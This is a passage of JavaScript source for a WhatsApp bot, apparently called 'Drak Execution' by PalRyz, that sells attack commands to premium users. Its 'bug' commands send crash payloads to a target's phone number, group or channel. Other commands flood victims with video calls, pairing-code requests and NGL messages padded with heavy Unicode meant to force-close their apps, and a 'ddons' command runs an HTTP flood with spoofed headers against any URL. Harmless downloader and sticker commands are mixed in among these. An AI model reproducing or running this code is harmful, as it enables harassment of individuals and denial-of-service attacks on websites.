┃ ⧎ .Ping
┃ ⧎ .Brat
┃ ┗━━━━━━━━━━❏
╰════════════════❍

> 🔥 *Drak Execution System Ready*`;

    await PalRyz.sendMessage(m.chat, {
        image: { url: "https://raw.githubusercontent.com/Nazir99inf/database/main/uploads/1751247128662.jpg" },
        caption: itsmenu,
        footer: 'Pilih tombol di bawah untuk lanjut ke Menu Awal',
        buttons: [
            { buttonId: '.menu', buttonText: { displayText: '𝐁͢𝐚͡𝐜⍣𝐤͜𝐌͢𝐞͡𝐧͡𝐮' }, type: 1 }
        ],
        headerType: 4
    }, { quoted: qkontak });

    await PalRyz.sendMessage(m.chat, {
        audio: { url: "https://raw.githubusercontent.com/Nazir99inf/database/main/uploads/1751203656275.mp3" },
        mimetype: 'audio/mpeg',
        ptt: true
    }, { quoted: qkontak });
}
break;
//======================
case "addmurbug": {
if (!isCreator) return m.reply(mess.owner);
if (!text) return m.reply("❌ Example: /addmurbug (nomor)");
let user = text.replace(/[^\d]/g, "");
addPremiumUser(user, 30);
m.reply(`✅ Add murbug:\n• ${user} (30 days)`)}
break;
//======================
case "delmurbug": {
if (!isCreator) return m.reply(mess.owner);
if (!text) return m.reply("❌ Example: /delmurbug (nomor)");
let user = text.replace(/[^\d]/g, ""); 
let removed = delPremiumUser(user);
m.reply(removed ? `✅ Removed murbug:\n• ${user}` : "❌ User tidak ditemukan")}
break;
//======================
//case reactch
  case "spamreactch": {

if (!isPremium) return m.reply('Khusus Premium');

if (!text) return m.reply(".spamreactch linkpesan 😂")

if (!args[0] || !args[1]) return m.reply("Wrong Format")

if (!args[0].includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")

let result = args[0].split('/')[4]

let serverId = args[0].split('/')[5]

let res = await PalRyz.newsletterMetadata("invite", result)

await PalRyz.newsletterReactMessage(res.id, serverId, args[1])

m.reply(`Berhasil mengirim reaction ${args[1]} ke dalam channel ${res.name}`)

}

break      
//case spam pair
case 'gckill': case 'delaygc': case 'killgc': {
    if (!isPremium && !isCreator) return m.reply(`Khusus Owner`);
    if (!isPremium && !isCreator) return m.reply(`*Can only be used in bot numbers*`);
    m.reply(`*Succes*`)
    for (let i = 0; i < 20; i++) {
            await bug3(m.chat) 
        }
    }
break;

case 'gckill2':
case 'delaygc2':
case 'killgc2': {
  if (!isPremium && !isCreator) return m.reply(`❌ Fitur khusus *Owner/Premium*`);
  if (!text) return m.reply(`❗ Masukkan link grup!\nContoh: ${prefix + command} https://chat.whatsapp.com/XXXX`);

  const regex = /chat\.whatsapp\.com\/([0-9A-Za-z]{20,})/;
  const link = text.match(regex);
  if (!link) return m.reply("❌ Link grup tidak valid!");

  const inviteCode = link[1];

  try {
    // ✅ Join grup via link
    let groupJid = await conn.groupAcceptInvite(inviteCode).catch(() => null);
    if (!groupJid) return m.reply("❌ Gagal masuk ke grup! Link invalid atau sudah kedaluwarsa.");

    m.reply(`✅ Berhasil masuk ke grup\n🚀 Mengirim 20 bug...`);

    for (let i = 0; i < 20; i++) {
      await bug3(groupJid);
      await sleep(500); // delay antar bug
    }

    await sleep(1000);
    await conn.groupLeave(groupJid);
    m.reply(`✅ Selesai! Telah keluar dari grup.`);
  } catch (err) {
    console.error(err);
    m.reply("❌ Terjadi kesalahan saat memproses perintah.");
  }
}
break;

//====================[ CASE BUG ]===========================//
case 'force-close': case 'force-beta': case 'force-andro': case 'fc': { // BUG HARD
if (!isPremium && !isCreator) return m.reply('[ ! ] Fitur Ini Khusus User Premium')
if (!q) return m.reply(`Example : ${command} 62xxx`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
let DoneBug = `*\`𝗦𝘂𝗸𝘀𝗲𝘀 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴 𝗧𝘆𝗽𝗲 ${command}\`*
𝐍𝐨𝐦𝐨𝐫 𝐓𝐚𝐫𝐠𝐞𝐭= *${pepec}*

⚠️𝗪𝗔𝗥𝗡𝗜𝗡𝗚⚠️
*ʜᴀʀᴀᴘ ᴊᴇᴅᴀ sᴇʟᴀᴍᴀ 𝟻 ᴍᴇɴɪᴛ ᴀɢᴀʀ ᴛᴇʀʜɪɴᴅᴀʀɪ ᴅᴀʀɪ ᴋᴇɴᴏɴ!*

> PalRyz 🦠

`;
await PalRyz.sendMessage(m.chat, {
    image: { url: 'https://files.catbox.moe/lns01e.jpg' },
    caption: DoneBug,
    gifPlayback: true
}, { quoted: palaj });
// Memulai Crashing
for (let i = 0; i < 1; i++) {
await CrlSqL(target);
await FlowXNull(target);
}
await PalRyz.sendMessage(m.chat, {audio: fs.readFileSync('./menu.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
m.reply(`*𝗕𝗨𝗚 𝗦𝗨𝗖𝗖𝗘𝗦𝗙𝗨𝗟𝗟𝗬 𝗦𝗘𝗡𝗧 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧*`); 
}
break

    case 'pal-ios': { // BUG HARD
if (!isPremium && !isCreator) return m.reply('[ ! ] Fitur Ini Khusus User Premium')
if (!q) return m.reply(`Example : ${command} 62xxx`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
let DoneBug = `*\`𝗦𝘂𝗸𝘀𝗲𝘀 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴 𝗧𝘆𝗽𝗲 ${command}\`*
𝐍𝐨𝐦𝐨𝐫 𝐓𝐚𝐫𝐠𝐞𝐭= *${pepec}*

⚠️𝗪𝗔𝗥𝗡𝗜𝗡𝗚⚠️
*ʜᴀʀᴀᴘ ᴊᴇᴅᴀ sᴇʟᴀᴍᴀ 𝟻 ᴍᴇɴɪᴛ ᴀɢᴀʀ ᴛᴇʀʜɪɴᴅᴀʀɪ ᴅᴀʀɪ ᴋᴇɴᴏɴ!*

> PalRyz 🦠

`;
await PalRyz.sendMessage(m.chat, {
    image: { url: 'https://files.catbox.moe/lns01e.jpg' },
    caption: DoneBug,
    gifPlayback: true
}, { quoted: palaj });
// Memulai Crashing
await loadedIos(target);
await PalRyz.sendMessage(m.chat, {audio: fs.readFileSync('./menu.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
m.reply(`*𝗕𝗨𝗚 𝗦𝗨𝗖𝗖𝗘𝗦𝗙𝗨𝗟𝗟𝗬 𝗦𝗘𝗡𝗧 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧*`); 
}
break

case 'palryz-ch': case 'pal-ch': case 'killch': {
if (!isCreator) return;
if (!q) return PalRyz.sendMessage(m.chat, { text: "Masukkan ID newsletter!\nContoh: .ch id@newsletter" }, { quoted: m });
let newsletterId = text.trim(); 
await (async () => {
for (let r = 0; r < 20; r++) {
await CrashJids(newsletterId);
await CrashJids(newsletterId);
await CrashJids(newsletterId);
}
})();
PalRyz.sendMessage(m.chat, { text: `✅ Berhasil mengirim Bug ke ${newsletterId}.` }, { quoted: m });
break }
        
case 'pal-force':
case 'fc-wak':
case 'fc-palryz': { // BUG HARD
    if (!isPremium && !isCreator) return m.reply('[ ! ] Fitur Ini Khusus User Premium');
    if (!q) return m.reply(`Example : ${command} 62xxx`);
    
    let pepec = q.replace(/[^0-9]/g, "");
    let target = pepec + '@s.whatsapp.net';
    
    let DoneBug = `*\`𝗦𝘂𝗸𝘀𝗲𝘀 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴 𝗧𝘆𝗽𝗲 ${command}\`*
𝐍𝐨𝐦𝐨𝐫 𝐓𝐚𝐫𝐠𝐞𝐭 = *${pepec}*

⚠️𝗪𝗔𝗥𝗡𝗜𝗡𝗚⚠️
*ʜᴀʀᴀᴘ ᴊᴇᴅᴀ sᴇʟᴀᴍᴀ 𝟻 ᴍᴇɴɪᴛ ᴀɢᴀʀ ᴛᴇʀʜɪɴᴅᴀʀɪ ᴅᴀʀɪ ᴋᴇɴᴏɴ!*

> PalRyz 🦠`;

    await PalRyz.sendMessage(m.chat, {
    image: { url: 'https://files.catbox.moe/lns01e.jpg' },
    caption: DoneBug,
    gifPlayback: true
}, { quoted: palaj });

    // Memulai Crashing (6x)
    for (let i = 0; i < 6; i++) {
        await FlowXNull(target);
    }

    await PalRyz.sendMessage(m.chat, {
        audio: fs.readFileSync('./menu.mp3'),
        mimetype: 'audio/mpeg',
        ptt: true
    }, { quoted: m });

    m.reply(`*𝗕𝗨𝗚 𝗦𝗨𝗖𝗖𝗘𝗦𝗙𝗨𝗟𝗟𝗬 𝗦𝗘𝗡𝗧 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧*`);
}
break;

case 'delayinvis':
case 'delayhard':
case 'delaymedium': { // BUG HARD
    if (!isPremium && !isCreator) return m.reply('[ ! ] Fitur Ini Khusus User Premium')
    if (!q) return m.reply(`Example : ${command} 62xxx`)
    
    let pepec = q.replace(/[^0-9]/g, "")
    let target = pepec + '@s.whatsapp.net'
    
    let DoneBug = `*\`𝗦𝘂𝗸𝘀𝗲𝘀 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴 𝗧𝘆𝗽𝗲 ${command}\`*
𝐍𝐨𝐦𝐨𝐫 𝐓𝐚𝐫𝐠𝐞𝐭 = *${pepec}*

⚠️𝗪𝗔𝗥𝗡𝗜𝗡𝗚⚠️
*ʜᴀʀᴀᴘ ᴊᴇᴅᴀ sᴇʟᴀᴍᴀ 𝟻 ᴍᴇɴɪᴛ ᴀɢᴀʀ ᴛᴇʀʜɪɴᴅᴀʀɪ ᴋᴇɴᴏɴ!*

> PalRyz 🦠`;

    await PalRyz.sendMessage(m.chat, {
    image: { url: 'https://files.catbox.moe/lns01e.jpg' },
    caption: DoneBug,
    gifPlayback: true
}, { quoted: palaj });

    // Memulai Crashing
    await bug2(target);

    await PalRyz.sendMessage(m.chat, {
        audio: fs.readFileSync('./menu.mp3'),
        mimetype: 'audio/mpeg',
        ptt: true
    }, { quoted: m });

    m.reply(`*𝗕𝗨𝗚 𝗦𝗨𝗖𝗖𝗘𝗦𝗙𝗨𝗟𝗟𝗬 𝗦𝗘𝗡𝗧 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧*`);
}
break;

case 'delaydozer': case 'bulldozer': case 'sepongkuota': { // BUG HARD
 if (!isPremium && !isCreator) return m.reply('[ ! ] Fitur Ini Khusus User Premium')
if (!q) return m.reply(`Example : ${command} 62xxx`)
let pepec = q.replace(/[^0-9]/g, "")
let target = pepec + '@s.whatsapp.net'
let DoneBug = `*\`𝗦𝘂𝗸𝘀𝗲𝘀 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴 𝗧𝘆𝗽𝗲 ${command}\`*
𝐍𝐨𝐦𝐨𝐫 𝐓𝐚𝐫𝐠𝐞𝐭= *${pepec}*

⚠️𝗪𝗔𝗥𝗡𝗜𝗡𝗚⚠️
*ʜᴀʀᴀᴘ ᴊᴇᴅᴀ sᴇʟᴀᴍᴀ 𝟻 ᴍᴇɴɪᴛ ᴀɢᴀʀ ᴛᴇʀʜɪɴᴅᴀʀɪ ᴅᴀʀɪ ᴋᴇɴᴏɴ!*

> PalRyz 🦠

`;
await PalRyz.sendMessage(m.chat, {
    image: { url: 'https://files.catbox.moe/lns01e.jpg' },
    caption: DoneBug,
    gifPlayback: true
}, { quoted: palaj });
// Memulai Crashing
await bulldozer3(target);
await PalRyz.sendMessage(m.chat, {audio: fs.readFileSync('./menu.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
m.reply(`*𝗕𝗨𝗚 𝗦𝗨𝗖𝗖𝗘𝗦𝗙𝗨𝗟𝗟𝗬 𝗦𝗘𝗡𝗧 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧*`); 
}
break

//SPAM CALL                                
async function sendOfferVideoCall(target) {
    try {
        await PalRyz.offerCall(target, { 
        video: true 
        });
        console.log(chalk.white.bold(`Success Send Offer Video Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Video Call To Target:`, error));
    }
}
      
 case 'stelp':          
 case 'spamtelp': { // SPAM TELP
if (!isCreator && !isPremium) return m.reply(`Fitur ini Khusus Owner`) 
if (!q) {
Reply(`Penggunaan ${prefix + command} 628xxx`)
} else {
const blockedNum = '6283891457614@s.whatsapp.net';
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return m.reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628xxx`)
let target = pepec + '@s.whatsapp.net'
if (target === blockedNum) {
	buttonReply('*Developernya seleb kocak, gabakal diangkat telp gw👺*');
	} else {
await PalRyz.sendMessage(m.chat, { react: { text: "📲",key: m.key,}}),
await sleep(1500)
await PalRyz.sendMessage(m.chat, { react: { text: "🎉",key: m.key,}}); 
           m.reply(`*Succes spam call to target ${pepec}*`) 
            PalRyz.sendMessage(target, {text: `halo mass`});
for (let i = 0; i < 100; i++) {
sendOfferVideoCall(target)

await sleep(2000)
}            
 PalRyz.sendMessage(target, {text: `halo mass`});
}
}
    }
break
//======================
case 'spampairing': {
  if (!isPremium) return m.reply('Khusus Premium');
  if (!text) return m.reply(`*Example:* ${prefix + command} +628xxxxxx|150`);
  m.reply('proses...');
  let [peenis, pepekk = "200"] = text.split("|");
  let target = peenis.replace(/[^0-9]/g, '').trim();
  const { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
  const { state } = await useMultiFileAuthState('pepek');
  const { version } = await fetchLatestBaileysVersion();
  const pino = require("pino");
  const sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) });
  const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
  for (let i = 0; i < pepekk; i++) {
    await sleep(1500);
    let prc = await sucked.requestPairingCode(target);
    console.log(`_Succes Spam Pairing Code - Number : ${target} - Code : ${prc}_`);
  }
  await sleep(15000);
}
break;

case "ddons": {
  if (!isCreator && !isPremium) return m.reply("❌ Fitur ini hanya untuk *Owner/Premium*.");
  if (!text || !text.includes("http")) return m.reply(`📌 Contoh penggunaan:\n${prefix + command} https://target.com 1h`);

  let [url, waktu] = text.trim().split(" ");
  let durasi = 60; // default 60 detik

  if (!waktu) waktu = "60s";
  waktu = waktu.toLowerCase();

  // Konversi waktu
  if (waktu.endsWith("h")) durasi = parseInt(waktu) * 3600;
  else if (waktu.endsWith("m")) durasi = parseInt(waktu) * 60;
  else if (waktu.endsWith("s")) durasi = parseInt(waktu);
  else durasi = parseInt(waktu);

  if (isNaN(durasi) || durasi <= 0) return m.reply("❗ Durasi tidak valid.");
  if (durasi > 3600) return m.reply("❗ Maksimum hanya 1 jam (3600 detik).");

  m.reply(`🚀 Mulai menyerang ${url}\n🕒 Durasi: ${Math.floor(durasi / 60)} menit...\n💣 Mode: HARD`);

  const stopTime = Date.now() + durasi * 1000;
  let totalSent = 0;

  while (Date.now() < stopTime) {
    for (let i = 0; i < 200; i++) {
      fetch(url + "?" + Math.random(), {
        method: "GET",
        headers: {
          "User-Agent": randomUserAgent(),
          "X-Forwarded-For": randomIP(),
          "Referer": url,
          "Accept": "*/*",
          "Connection": "keep-alive"
        }
      }).catch(() => {});
      totalSent++;
    }

    if (totalSent % 5000 === 0) {
      m.reply(`📡 Progress: ${totalSent} request dikirim ke ${url}`);
    }

    await sleep(300);
  }

  m.reply(`✅ Selesai!\n🌐 Target: ${url}\n📤 Total Request: ${totalSent}\n⏱ Durasi: ${Math.floor(durasi / 60)} menit`);
}
break;

// ==== FUNGSI TAMBAHAN ====

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function randomUserAgent() {
  const agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Linux; Android 13)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64)",
    "Mozilla/5.0 (Linux; U; Android 10; en-US; SM-G975F)"
  ];
  return agents[Math.floor(Math.random() * agents.length)];
}

function randomIP() {
  return Array.from({ length: 4 }, () => Math.floor(Math.random() * 256)).join(".");
}

case 'tourl': {
  if (!m.quoted || !/image|video|audio|document/.test(m.quoted.mimetype)) {
    return m.reply('Balas media (gambar/video/audio/file) dengan perintah *.tourl*');
  }

  const buffer = await m.quoted.download();
  const tmpPath = './tmp/' + new Date().getTime() + '-' + (m.quoted.mimetype.replace(/\//g, '.'));
  fs.writeFileSync(tmpPath, buffer);

  try {
    const link = await CatBox(tmpPath);
    m.reply(`✅ Berhasil diupload ke Catbox:\n\n📦 URL: ${link}`);
  } catch (e) {
    m.reply(`❌ Gagal upload: ${e.message}`);
  } finally {
    fs.unlinkSync(tmpPath); // hapus file sementara
  }
}
break;

case 'enc-offline':
case 'enc':
case 'encodeoffline': {
  if (!text) return m.reply(`📌 Masukkan kode JavaScript untuk di-encode offline.\n\nContoh:\n.enc-offline const hello = () => console.log("PalRyz")`)

  try {
    const fs = require('fs')
    const encodeOffline = require('./lib/encode-offline')
    const { filePath, fileName } = await encodeOffline(text)

    await PalRyz.sendMessage(m.chat, {
      document: fs.readFileSync(filePath),
      fileName,
      mimetype: 'application/javascript',
      caption: `✅ Encode OFFLINE selesai!\nObfuscated by PalRyz.`
    }, { quoted: m })

    fs.unlinkSync(filePath)
  } catch (err) {
    console.error('[ENCODE OFFLINE ERROR]', err)
    m.reply(typeof err === 'string' ? err : '❌ Terjadi kesalahan saat encode offline.')
  }
}
break;
case 'backup': {
  if (!isCreator) return m.reply('❌ Fitur ini hanya untuk owner!');
  m.reply('📦 Membuat backup ZIP...')

  const fs = require('fs');
  const archiver = require('archiver');
  const zipName = `Backup-DrakExecution-${Date.now()}.zip`;

  const output = fs.createWriteStream(zipName);
  const archive = archiver('zip', { zlib: { level: 9 } });

  archive.pipe(output);

  // File utama
  const filesToInclude = [
    'index.js',
    'package.json',
    'Tqto.mp3',
    'menu.mp3'
  ];

  // Tambah file satu-satu
  filesToInclude.forEach(file => {
    if (fs.existsSync(file)) archive.file(file, { name: file });
  });

  // Tambah folder system dan seluruh isinya
  if (fs.existsSync('system')) {
    archive.directory('system/', 'system');
  }

  await archive.finalize();

  output.on('close', async () => {
    await PalRyz.sendMessage(m.sender, {
      document: fs.readFileSync(zipName),
      fileName: zipName,
      mimetype: 'application/zip',
      caption: `📦 *Backup Berhasil!*\nUkuran: ${(archive.pointer() / 1024).toFixed(2)} KB`
    }, { quoted: m });
    
    fs.unlinkSync(zipName); // Hapus setelah dikirim
  });
}
break;

case 'ping': {
  const { performance } = require('perf_hooks')
  const old = performance.now()
  const loading = await PalRyz.sendMessage(m.chat, {
    text: '🔍 Ping sedang diukur...'
  }, { quoted: m })
  const neww = performance.now()
  const speed = neww - old

  // Fungsi convert runtime
  const runtime = (() => {
    const uptimeMs = new Date() - global.startTime
    if (isNaN(uptimeMs)) return '❌ Tidak diketahui'

    const seconds = Math.floor((uptimeMs / 1000) % 60)
    const minutes = Math.floor((uptimeMs / (1000 * 60)) % 60)
    const hours = Math.floor((uptimeMs / (1000 * 60 * 60)) % 24)
    const days = Math.floor(uptimeMs / (1000 * 60 * 60 * 24))
    return `${days} Hari ${hours} Jam ${minutes} Menit ${seconds} Detik`
  })()

  const teks = `╭──「 *📡 Status Bot* 」
│ ⏱️ *Runtime:* ${runtime}
│ 💡 *Response:* ${speed.toFixed(2)} ms
│ 👤 *User:* @${m.sender.split('@')[0]}
╰───────────────⟢`

  await PalRyz.sendMessage(m.chat, {
    text: teks,
    mentions: [m.sender],
    footer: "Drak Execution - Advanced WhatsApp System",
    buttons: [
      {
        buttonId: '.menu',
        buttonText: { displayText: '𝐁͢𝐚͡𝐜⍣𝐤͜𝐌͢𝐞͡𝐧͡𝐮' },
        type: 1,
      }
    ],
    headerType: 1
  }, { quoted: m })
  break
}

case 'brat': {
  if (!isCreator && !isPremium) return m.reply('❌ Fitur ini hanya untuk Owner/Premium!')
  if (!text) return m.reply(`Contoh: ${prefix + command} Aku marah banget hari ini!`)
  if (text.length > 250) return m.reply(`❌ Karakter terlalu panjang! Maksimal 250 karakter.`)

  // Reaksi emoji (pengganti lyreact)
  await PalRyz.sendMessage(m.chat, {
    react: { text: "😡", key: m.key }
  })

  m.reply('⏳ Sedang membuat sticker brutal...')

  try {
    const res = await fetch(`https://aqul-brat.hf.space/?text=${encodeURIComponent(text)}`)
    if (!res.ok) throw 'Gagal ambil dari API!'
    const buffer = await res.buffer()

    await PalRyz.sendImageAsSticker(m.chat, buffer, m, {
      packname: packname || 'DRAK EXECUTION',
      author: author || 'PalRyz'
    })
  } catch (e) {
    console.error(e)
    m.reply('❌ Gagal membuat sticker. Coba lagi nanti.')
  }
}
break;

case 'spamngl': {
  if (!q.includes("|")) return m.reply(`*Example:*\n.spamngl ngl.link/username | Kamu ganteng 😎`)
  
  let [link, pesan] = q.split("|").map(v => v.trim())
  let jumlah = 200
  let user = link
    .replace("https://ngl.link/", "")
    .replace("http://", "")
    .replace("https://", "")
    .replace("ngl.link/", "")
    .replace("/", "")
  
  if (!user) return m.reply("❌ Username tidak valid!")
  if (!pesan) return m.reply("❌ Masukkan pesan yang ingin dikirim.")

  // Tambahkan teks berat (kombinasi karakter aneh, unicode rusak, emoji, dan invisible)
  const heavyText = `${pesan}\n\n` + "𑇂𑆵𑆴𑆿".repeat(5000) + "\u200F".repeat(1000) + "\n" +
                    "𓆩𓆪".repeat(500) + "🗿😈🥴💣🌀".repeat(300) + "\n" +
                    [...Array(200)].map(() => String.fromCharCode(Math.floor(Math.random()*4000) + 10000)).join('')

  await m.reply(`⏳ Mengirim *${jumlah} pesan berat* ke akun NGL *@${user}*...`)

  for (let i = 0; i < jumlah; i++) {
    try {
      await axios.post("https://ngl.link/api/submit", {
        username: user,
        question: heavyText,
        deviceId: randomDevice(),
        gameSlug: "",
        referrer: ""
      }, {
        headers: {
          "content-type": "application/json"
        }
      })
      await sleep(400) // delay agar tidak terlalu spam
    } catch (err) {
      console.log(`❌ Gagal kirim ke-${i + 1}:`, err.message)
    }
  }

  m.reply(`✅ *${jumlah} pesan BERAT* berhasil dikirim ke *@${user}* melalui NGL!\nCoba dia buka... semoga lag atau FC 😈`)
}
break
case 'ai':
    case 'chatgpt':
    case 'palai': {
      try {
        if (!text) return m.reply(`Contoh: .ai hai`)
        let pesan = text.toLowerCase().trim();
        const closePattern = /\b(?:coba|mohon|tolong|ayo|yuk|dong|ya|please|silakan|bisa|minta|mohonlah)?\s*(tutup|lock|kunci|nonaktifkan|matikan|diamkan|stop|disable|mode\s+diam|mute)\s*(grup|gc|gb|room|chat|obrolan|forum)\s*(ini|nya|dong|ya|sekarang|segera|plis|bang)?\b/i;

        const openPattern = /\b(?:coba|mohon|tolong|ayo|yuk|dong|ya|please|silakan|bisa|minta|mohonlah)?\s*(buka|unlock|aktifkan|hidupkan|nyalakan|izinkan|mode\s+bebas|unmute)\s*(grup|gc|gb|room|chat|obrolan|forum)\s*(ini|nya|dong|ya|sekarang|segera|plis|bang)?\b/i;

        if (closePattern.test(pesan)) {
          if (m.isGroup) {
            if (mek.key.fromMe || isAdmins || isOwner) {
              await PalRyz.groupSettingUpdate(m.chat, 'announcement')
              return;
            }
          }
        }

        if (openPattern.test(pesan)) {
          if (m.isGroup) {
            if (mek.key.fromMe || isAdmins || isOwner) {
              await PalRyz.groupSettingUpdate(m.chat, 'not_announcement')
              return;
            }
          }
        }

        async function AI(content) {
          try {
            const response = await axios.post('https://luminai.my.id/', {
              content,
              cName: "S-AI",
              cID: "S-AIbAQ0HcC"
            });

            return response.data;
          } catch (error) {
            console.error(error);
            throw error;
          }
        }

        let sai = await AI(pesan);
        m.reply(sai.result);

      } catch (err) {
        console.error(err);
        m.reply('Terjadi kesalahan');
      }
    }
    break

// Masukkan ke dalam switch(command):
case 'tt':
case 'tiktok': {
 if (!text) return m.reply('🚫 Kirimkan link TikTok.\nContoh:\n.tiktok https://www.tiktok.com/@username/video/1234567890');
 if (!/tiktok\.com|vt\.tiktok\.com/.test(text)) return m.reply('❗ Link tidak valid. Pastikan link berasal dari TikTok.');

 try {
 const axios = require('axios');
 const { data } = await axios.get(`https://tikwm.com/api/?url=${encodeURIComponent(text)}`);
 if (!data || !data.data) return m.reply('❌ Gagal mengambil data. Pastikan link valid dan coba lagi.');

 const res = data.data;
 const videoUrl = res.play || res.video_url || null;
 const audioUrl = res.music || null;
 const images = Array.isArray(res.images) ? res.images : [];
 const isPhotoPost = images.length > 0;
 const title = res.title || '(Tidak ada judul)';
 const username = res.author?.nickname || res.author?.unique_id || 'Tidak diketahui';
 const likeCount = res.digg_count || 0;
 const commentCount = res.comment_count || 0;

 const caption = `🎬 *TikTok*\n\n` +
 `📌 *Judul:* ${title}\n` +
 `👤 *User:* @${username}\n` +
 `❤️ *Likes:* ${likeCount.toLocaleString()}\n` +
 `💬 *Komentar:* ${commentCount.toLocaleString()}`;

 // 🔹 Jika konten berupa FOTO (bukan video)
 if (isPhotoPost) {
 const slide = images.map((img, index) => ({
 image: { url: img },
 caption: index === 0 ? caption : undefined
 }));

 for (const item of slide) {
 await PalRyz.sendMessage(m.chat, item, {
 quoted: palaj
 });
 }
 }

 // 🔹 Jika konten berupa VIDEO
 if (!isPhotoPost && videoUrl) {
 await PalRyz.sendMessage(m.chat, {
 video: { url: videoUrl },
 mimetype: 'video/mp4',
 caption
 }, { quoted: palaj });
 }

 // 🔹 Kirim AUDIO jika tersedia
 if (audioUrl) {
 await PalRyz.sendMessage(m.chat, {
 audio: { url: audioUrl },
 mimetype: 'audio/mpeg',
 ptt: true
 }, { quoted: palryz });
 }

 } catch (e) {
 console.error(e);
 m.reply('❌ Terjadi kesalahan saat mengambil data TikTok.');
 }
}
break;

case 'ig':
    case 'igdl':
    case 'instagram': {
      try {
        if (!text) return m.reply(`Contoh: .ig linknya`)
        if (!text.includes('instagram.com')) return m.reply('Harus berupa link instagram!')
        lyreact()
        let jor = await fetchJson(`https://vapis.my.id/api/igdl?url=${Enc(text)}`)
        await PalRyz.sendMessage(m.chat, {
          video: {
            url: jor.data[0].url
          },
          caption: `© ${wm}`
        }, {
          quoted: m
        })
      } catch (err) {
        try {
          let jor = await fetchJson(`https://vapis.my.id/api/igdl?url=${Enc(text)}`)
          await PalRyz.sendMessage(m.chat, {
            image: {
              url: jor.data[0].url
            },
            caption: `© ${wm}`
          }, {
            quoted: m
          })
        } catch (err) {
          console.error('Kesalahan pada API:', err)
          m.reply('Terjadi kesalahan saat mengambil media')
        }
      }
    }
    break
//======================
default:
}} catch (err) {
console.log('\x1b[1;31m'+err+'\x1b[0m')}}